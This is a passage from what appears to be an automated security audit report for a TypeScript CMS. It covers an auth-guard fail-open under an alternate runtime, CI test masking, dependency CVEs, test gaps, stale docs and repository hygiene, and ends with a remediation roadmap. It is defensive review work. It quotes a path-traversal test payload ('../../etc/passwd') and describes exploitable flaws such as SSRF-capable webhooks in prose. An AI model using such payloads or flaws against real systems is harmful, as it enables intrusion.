`writer.ts:172-198`: INSERT with placeholder `0` then UPDATE to `id` — a crash between leaves `translationGroupId=0` permanently (sibling joins break). Separately, the SELECT-then-INSERT dup check races: two simultaneous creates of the same (type,slug,locale) both pass, and `uq_content_slug` makes the second INSERT throw an uncaught `ER_DUP_ENTRY` → 500 instead of the intended 409.
**Fix:** single-statement/transactional group-id assignment; catch duplicate-key errors and map to the validation shape.

---

## 7. The Perry-compat branch (working diff review)

This branch's purpose is Perry-runtime compatibility. The committed change (bcrypt 12→10) and the working diff (`server.ts` inline `node:http` adapter, `notAuth()` guard, `seed.ts` counter typing, `package.json` `perry` block) are individually reasonable, but the branch is **incompletely applied** in one security-relevant way.

**7.1 — HIGH (latent, Perry target) — The `instanceof Response` → `notAuth()` fix was applied to the admin only; the entire `/api/v1` surface still uses `instanceof Response`, which is a fail-open under Perry.**
CLAUDE.md documents that under Perry `x instanceof Response` is **always false** for the native fetch handle. The working diff replaces every admin guard with `notAuth()` (field-based discriminator) — correct — but **54 `instanceof Response` checks remain across 11 API route files** (`auth, content, forms, jobs, media, menus, redirects, settings, types, users, webhooks`). Under Perry:
- Inline-guard routes (menus, content, users, …) dereference `auth.user.id` immediately after the check, so an unauthenticated request **crashes** (500) — fail closed, but broken.
- **Guard-helper routes fail *open*.** In `webhooks.ts`, `guard()` returns a `Response` for an authenticated-but-unauthorized user, and the route bodies (`GET/POST/PATCH/DELETE /webhooks`) never touch `g.user` after `if (g instanceof Response) return g;`. Under Perry that check is skipped and the mutation runs — **any logged-in user can manage webhooks** (including the SSRF-capable create). This is exactly the footgun CLAUDE.md warns about.
Not exploitable today (on Node/Bun `instanceof` works; Perry can't serve any request yet per the open `app.fetch` `Symbol()` bug), but it will activate the moment Perry serving lands, and it's an inconsistency that should be closed now while the context is fresh.
**Fix:** replace **all** `instanceof Response` auth guards repo-wide with a single shared discriminator (`isResponse()`/`notAuth()`), and never rely on a post-guard `.user` dereference for safety.

**7.2 — Notes on the inline `node:http` adapter (`server.ts`).** The header rebuild from `req.rawHeaders`, the text/binary body coercion, and synchronous `data`/`end` registration are correct and portable. Two observations: the adapter **buffers the entire request body and the entire response** in memory (ties into §3.5 — add a size cap), and the startup warmup `app.fetch('/healthz')` swallows all errors (inert on Node, intended for Perry id-counter advancement — fine, but document its removal condition, already noted in-code). No Node/Bun regression.

**7.3 — INFO — `package.json` ends without a trailing newline** after the added `perry` block; harmless but worth a POSIX newline.

**7.4 — INFO — bcrypt cost applies to all runtimes** — see §1.11.

---

## 8. Build, CI, dependencies & release

**8.1 — CRITICAL — CI integration tests can neither fail nor detect a missing DB (the safety net verifies nothing).**
Two independent defects combine:
- `package.json:26` — `test:integration` is `ls … && node --test … || echo 'no integration tests'`. In an `A && B || C` chain, if `B` (the test run) **fails**, bash falls into `|| C` and the whole line **exits 0** (reproduced with a deliberately failing test). Integration tests (`admin.test.ts`, `api.test.ts`) cannot fail CI regardless of assertions.
- Each integration test self-skips via `mysqlAvailable()` → `test(name, { skip: … })` (`tests/helpers/db.ts`). If CI's MySQL is ever unreachable, all 34 tests report "skipped," exit 0, and CI is green having verified nothing. `test.yml` doesn't assert the DB is reachable.
Given CLAUDE.md's invariant "CI must be green," a green pipeline that verifies nothing is a critical process gap — every finding in this report could have been introduced undetected.
**Fix:** replace the `&&/||` one-liner with explicit `if/then/else` so the runner's exit code propagates; add a CI-only tripwire that fails when `HAS_DB` is false (assert reachability before running, or grep the output for `tests 0`).

**8.2 — HIGH — `hono@4.12.21` carries known CVEs; the fix is free and in-range.**
`npm audit` reports a high-severity advisory (CORS middleware reflecting any Origin with credentials, GHSA-88fw-hqm2-52qc) plus moderate ones (serve-static path traversal, header-merging). Fixed in 4.12.25+; latest `4.12.27` is inside the declared `^4.10.0` range. `hono/cors` and `hono/serve-static` aren't imported today, limiting blast radius — but there's no reason to carry known CVEs.
**Fix:** `npm update hono` (or `npm audit fix`) and commit the refreshed lockfile.

**8.3 — HIGH — `packages/site-kit/package-lock.json` is stale, silently degrading release reproducibility.**
`site-kit/package.json` declares `marked ^18.0.4`, but its lockfile has **no `marked` entry** (only devDependencies). `npm ci` from `working-directory: packages/site-kit` in `release.yml` therefore always fails the lock/manifest sync check and falls through to `npm install` — so the published tarball's `marked` version is resolved fresh at publish time and is never the exact version the tests exercised. The `npm ci || npm install` fallback masks this.
**Fix:** regenerate `site-kit`'s lockfile, or (better) drop per-package lockfiles and have `release.yml` install from the workspace root before building/publishing.

**8.4 — MEDIUM — No test-execution gate before `npm publish`.**
`release.yml` runs version-match → install → `npm run build` (tsc only) → `npm pack --dry-run` → `npm publish --provenance`, never re-running the packages' behavioral tests. A `workflow_dispatch` run or a tag on a commit that raced ahead of a red `main` publishes with only a typecheck-level guarantee.
**Fix:** run `npm run test:unit` before publish, or require the tag's commit to have a passing `test.yml` via branch protection.

**8.5 — MEDIUM — GitHub Actions pinned to floating tags, not commit SHAs.**
`test.yml` and `release.yml` use `actions/checkout@v4` / `actions/setup-node@v4`. Floating majors can be repointed with no diff here — materially worse in `release.yml`, which holds `id-token: write` (OIDC) and publish rights.
**Fix:** pin to commit SHAs (`@<sha> # v4.x`) and update via Dependabot/Renovate.

**8.6 — MEDIUM — `@hono/node-server` is a declared runtime dependency but dead code.**
`package.json:29` lists it, but `grep` finds zero imports (only an explanatory comment in `server.ts:112`); `server.ts` serves via the inline adapter, and CLAUDE.md says it's removed from the Perry path.
**Fix:** remove it from `dependencies` (and the lockfile) unless a fallback still needs it.

**8.7 — MEDIUM — `moduleResolution: "Bundler"` doesn't enforce ESM `.js` extensions, and CI never builds/boots `dist/`.**
CLAUDE.md documents at length that Node 22 strict ESM requires `.js` on relative imports in compiled output. `Bundler` resolution is lenient about this. Source is 100% disciplined today (229/229 relative imports carry `.js`), so no live bug — but there's no guardrail against regression, and `test.yml` only runs `tsc --noEmit` + `tsx` (both bundler-like); the actual artifacts (`dist/server.js`, `dist/cli/main.js`) are **never compiled or smoke-run** by CI.
**Fix:** switch root + both packages to `"module":"NodeNext","moduleResolution":"NodeNext"` (a missing extension becomes a compile error); add a CI step that `npm run build`s and boots `dist/server.js` to `/healthz` on ≥1 Node version.

**8.8 — MEDIUM — `scripts/build-perry.sh` symlink-resolution premise doesn't hold universally.**
The script exists to resolve the `~/.cargo/bin/perry` symlink to its real workspace path (CLAUDE.md: invoking via the symlink breaks native `node:http` linking). On this machine `~/.cargo/bin/perry` is a **regular file**, not a symlink, so `readlink` returns empty, the guard is false, and the script execs the symlink-equivalent path directly — the exact invocation CLAUDE.md says fails. CLAUDE.md's "compiles + boots" verification was "in an isolated worktree build," possibly a different install layout.
**Fix:** verify empirically (`npm run build:perry` here, confirm the binary actually binds `node:http`); resolve the workspace via a marker file/`PERRY_WORKSPACE` env rather than relying on symlink-walking; loop `readlink` and assert the final path is a real file.

**8.9 — LOW — `perry.config.json` and `package.json` both use `compilePackages` with different contents and no cross-reference.**
`perry.config.json` lists `@perryts/mysql, hono, bcryptjs`; `package.json`'s `perry.compilePackages` lists only `hono, bcryptjs` (correct — `@perryts/mysql` ships a `perry` export and doesn't need JS-AOT). Two mechanisms sharing a key name with nothing documenting the distinction.
**Fix:** add a one-line comment in each cross-referencing the other.

**8.10 — INFO — `exactOptionalPropertyTypes: false` is explicitly disabled** amid otherwise-strict options (`strict`, `noUncheckedIndexedAccess`, `noImplicitOverride`). No live bug; confirm it's deliberate (likely JSX/Hono type noise).

**8.11 — INFO — Transitive `esbuild` low-severity advisory via `tsx`** — dev-only, no exploitation path; clears on a `tsx` bump.

**Positives:** `test.yml` correctly uses the single `npm ci --include-workspace-root --workspaces` install (avoiding the documented workspace-prune pitfall) and a Node 22+24 matrix with a `mysql:8.4` service; `release.yml` OIDC is correct (`id-token: write`, no `registry-url`, `--provenance`, version-vs-tag check). Root tsconfig is otherwise strict.

---

## 9. Tests

Unit tests are strong exactly where they're cheap and pure; everything stateful is reachable only through the integration suite, which (per §8.1) can't fail CI.

- **9.1 — HIGH — Bearer-token auth path has zero coverage.** No test in `tests/` references `Bearer`, `apiTokens`, `createToken`, or `lookupToken`, yet the API spec says session and bearer auth are equally supported. A full, security-relevant path (`middleware.ts:33-45`) ships unverified — including whether revoked/expired tokens are rejected. **Fix:** add an integration test: create a token, authenticate with `Authorization: Bearer`, revoke, confirm 401.
- **9.2 — MEDIUM — Schema-evolution transforms untested.** `migrateFields()` handles `added`/`renamed`/`removed→_legacy`/`retyped`; only the "added" path is exercised (integration, needs DB). Given §6.1's rename data-loss bug, this is the code that most needs unit tests. **Fix:** add `tests/unit/schema-evolution.test.ts` covering each transform and multi-revision migration.
- **9.3 — MEDIUM — Job-queue concurrency/retry/dead-letter untested.** No test proves `FOR UPDATE SKIP LOCKED` prevents double-claim, or exercises backoff / `dead` transition / `recoverStuckJobs`. **Fix:** race two `claimNext` calls on one job; force a handler throw and assert backoff/dead-letter.
- **9.4 — MEDIUM — Media `sanitize()` path-traversal defense unverified.** It's safe on inspection but not exported and not asserted against adversarial filenames (`../../etc/passwd`, absolute paths, null bytes) — a refactor could silently reintroduce traversal. **Fix:** export it and unit-test that payloads never yield a `/` or escape `root` after `join()`.

**Measured health (this audit):** `tsc --noEmit` → exit 0 (clean). `test:unit` → **57/57 pass** (~430 ms). Integration not run here (needs MySQL).

**Positive:** real, meaningful unit coverage exists for permissions (`can()` ownership/wildcard cases), cache/ETag, datetime normalization, password hashing, content-writer validation, admin i18n, and the two published packages.

---

## 10. Documentation accuracy

- **10.1 — HIGH — Documented auth endpoints don't exist, and there is no password-reset path at all.** `docs/api-spec.md:142-174` documents `POST /auth/totp/setup|verify`, `DELETE /auth/totp`, `POST /auth/password-reset/request|confirm`. None are registered (`auth.ts` has only `/login`,`/logout`,`/me`,`/refresh`,`/tokens*`). The `passwordResets` table exists but is used nowhere — **users have no way to recover a forgotten password** via API, admin, or CLI. A real product gap, compounding §1.1. **Fix:** implement the flows or strike them and mark "not implemented"; prioritize password recovery.
- **10.2 — MEDIUM — README/`.env.example` present SMTP/Postmark/SES as available; all three are throw-stubs.** `adapter.ts:56-72` — only `log` and `resend` work; the rest throw "not yet implemented." A deployer choosing SMTP gets every queued email failing to `dead` with no alert path. **Fix:** caveat the docs to match the honest code comment.
- **10.3 — MEDIUM — Documented content-list filters don't exist and fail silently.** `api-spec.md:207-214` documents `q`, `tag`, `category`, custom-field, and `fields` params; `ListContentOptions` and the route support none of them, and Hono ignores unknown params — so a consumer's search box gets silently unfiltered results. **Fix:** implement them or strike them; consider 400 on unknown filter params.
- **10.4 — MEDIUM — `docs/perry-landing-integration.md` is stale and contradicts CLAUDE.md.** It describes a Next.js 16 static-export + Perry-Fastify cutover; CLAUDE.md describes the actual Hono + JSX + Tailwind rewrite in a separate repo. Two different stacks, no reconciliation. **Fix:** add a "superseded — see CLAUDE.md" banner or delete it.
- **10.5 — LOW — `docs/media-pipeline.md` proposes `sharp` (native C++) against README's non-negotiable "zero native deps."** Not yet in `package.json`, so a planning conflict, not a violation — but it should be flagged/resolved before implementation.
- **10.6 — LOW — README's global-capability list omits `viewSubmissions`** (12 vs the code's 13 in `GLOBAL_ACTIONS`).
- **10.7 — LOW — Leftover planning framing.** README opens "v0.1… end-to-end verified" but closes (`:824`) "**Next step:** approve this plan, then start scaffolding…"; `api-spec.md:3-6` still headers itself "Draft… lock changes before touching code" despite being substantially built and diverged. **Fix:** delete the stale lines.
- **10.8 — LOW — README test counts are stale** ("47 unit / 81 total" vs actual 57 / 91).

---

## 11. Repository & data hygiene

- **11.1 — HIGH — Real customer photos (`uploads-verrano/`, ~78 MB, 142 files) are untracked but NOT gitignored.** `.gitignore` ignores `uploads/` (exact literal), which does **not** match the sibling `uploads-verrano/` (confirmed: `git check-ignore uploads-verrano` → not ignored). The files are genuine product photography of a named catering business ("Verrano" — antipasti platters, carpaccio, Jausenplatte), and `docs/media-pipeline.md:27` references a real `verrano/site/src/ui.tsx` path. The README presents this as an MIT public repo. One `git add -A` commits a named customer's (possibly licensed) photography into public history permanently. **Fix:** add `uploads-verrano/` and a generic `uploads*/` to `.gitignore` **now**; investigate why a customer's live upload dir exists in the checkout (local dev pointed `MEDIA_LOCAL_PATH` at real customer uploads — should be an isolated fixture path).
- **11.2 — LOW — Internal deployment hostnames + root-SSH convention in a public-repo file.** `CLAUDE.md:220-230` names `root@builder.perryts.com` and `root@webserver.skelpo.net` and states the deploy logs in as `root`. Not a credential leak, but unnecessary topology disclosure in an MIT repo. **Fix:** move ops specifics to a private doc.

**Positives:** `.env` is **not** tracked; `dist/` and `node_modules/` are properly ignored; `.proof/`, `.testuploads/`, and `uploads/` are ignored; a `git grep` for secrets/keys/tokens across tracked files found no real credentials (only placeholders in `.env.example`); no large committed binaries.

---

## 12. What's done well

- **SQL layer is uniformly parameterized** — no injection found across the entire surface.
- **Media path handling is safe by construction** (server-generated, sanitized, single-segment keys; not user-settable on read).
- **No default admin credential** — the first admin is created via CLI, avoiding the classic `admin/admin` seed.
- **Secrets use a CSPRNG** (`crypto.getRandomValues`) for sessions, tokens, invites, webhook secrets; **API tokens are stored hashed** (`sha256`); a fresh session token is issued per login (no fixation).
- **Permission core is careful** — ownership checked before the `*Own` short-circuit, correct wildcard handling, unit-tested.
- **Rate-limiting exists** on both login paths with per-email and per-IP windows and success-reset.
- **Webhook signing** uses HMAC-SHA256 with a timestamp (good replay-mitigation shape).
- **Schema is well-indexed** (unique keys on emails/slugs/token-hashes, composite content indexes, FULLTEXT).
- **CI avoids the documented workspace-prune pitfall**; the release workflow's OIDC/provenance setup is correct.
- **Storage-agnostic media** and a clean Hono/JSX/HTMX architecture; strict TypeScript; real unit tests where they're cheap.
- The **Perry-compat working is genuinely careful** and well-documented in-code (rawHeaders, body coercion, sync listener registration) — §7.1 is an incompleteness, not a wrong approach.

---

## 13. Prioritized remediation roadmap

**Do immediately (hours):**
1. `.gitignore` `uploads-verrano/` + `uploads*/` (§11.1).
2. Bump `hono` ≥4.12.25 (§8.2).
3. Fix the `test:integration` exit-code masking + DB tripwire (§8.1).
4. Disable the fake-TOTP branch (fail closed) (§1.1).
5. Gate `GET /api/v1/settings` (§2.5).

**This week (correctness + authz):**
6. Sanitize `renderMarkdown`/`renderTipTap` output; block `javascript:` hrefs (§3.1).
7. Allowlist capability/role/user-role assignment; block built-in-role edits (§2.1).
8. Strip `status`/`publishedAt` from content create/update; require `publish` (§2.2).
9. Add `read`/`readDrafts` checks to admin content list/detail and the form-submission page (§2.3, §2.4).
10. Fix `invalidate()` to use dep keys; add a cache TTL; add an `onEvict` dep-cleanup (§4.1–4.3).
11. Fix cursor pagination (`MyDateTime` serialization + sort-aware keyset) (§5.1).
12. Add webhook URL validation (SSRF) + `fetch` timeout; add an upload size cap (§3.3, §3.5).

**This month (robustness + Perry):**
13. Replace all `instanceof Response` guards repo-wide with a shared discriminator (§7.1).
14. Set the DB session `time_zone` to UTC (or standardize on `UTC_TIMESTAMP()`) (§5.4).
15. Implement `scheduledPublish` producer; bound handler runtime under the lease (§5.2, §5.3).
16. Require explicit `changes` for schema renames; migrate-before-validate + advance `schemaRevision` (§6.1, §6.2).
17. Harden cookies (`Secure` via `x-forwarded-proto` + HSTS), real client-IP for rate-limiting, session-token hashing, invalidate-on-password-change, enforce token scopes (§1.2–1.7).
18. Add `.js`-extension-enforcing `moduleResolution` + a CI build/boot step; pin Actions to SHAs; add a pre-publish test gate (§8.5–8.7).
19. Fill the highest-value test gaps: bearer auth, schema evolution, job concurrency, media sanitize (§9).
20. Reconcile the docs (auth endpoints, email backends, list filters, stale integration doc) (§10).

---

## Appendix — coverage & method

Reviewed firsthand: `app.ts`, all of `auth/*`, `permissions/check.ts`, `config.ts`, `routes/api/{auth,users,menus,webhooks,media,forms,settings,content(read)}.ts`, `media/{local,store}.ts`, `webhooks/dispatch.ts`, `email/adapter.ts`, `db/seed.ts` (roles), `migrations/0001_initial.sql` (keys), `.env.example`, and the full working diff. Six parallel deep-dive passes covered the remainder (auth, injection, authz, correctness/concurrency, CI/build/deps, tests/docs/hygiene); all their claims were cross-checked against the code, and the load-bearing ones (Perry fail-open, `MyDateTime.toJSON`, CI exit masking, capability escalation, gitignore gap, `hono` version) were re-verified directly. Runtime facts about Perry are taken from CLAUDE.md and the branch's own notes; the CMS does not yet serve requests under Perry, so all Perry-specific findings are latent by definition.

*Generated by an automated audit on 2026-07-04. Severities reflect impact on the CMS as deployed today (Node/Bun); revisit once the Perry serve path lands.*
